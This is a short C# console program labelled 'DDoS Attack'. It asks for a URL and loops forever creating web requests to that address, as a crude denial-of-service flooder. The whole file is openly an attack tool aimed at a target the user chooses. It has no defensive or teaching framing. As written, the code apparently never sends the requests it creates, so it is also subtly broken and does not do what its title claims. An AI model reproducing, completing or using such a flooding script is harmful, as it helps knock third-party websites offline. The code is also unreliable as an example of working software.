using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Web;

namespace Attack
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            long count = 0;
            for(;;) 
            {
                Console.Title = "DDoS Attack";
                Console.Write("Write URL: ");
                string x = Console.ReadLine();
                while (true)
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(x);
                        Console.Write(count++);
                        Console.WriteLine(x);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        break;
                    }
                }
            }
            
        }
    }
}
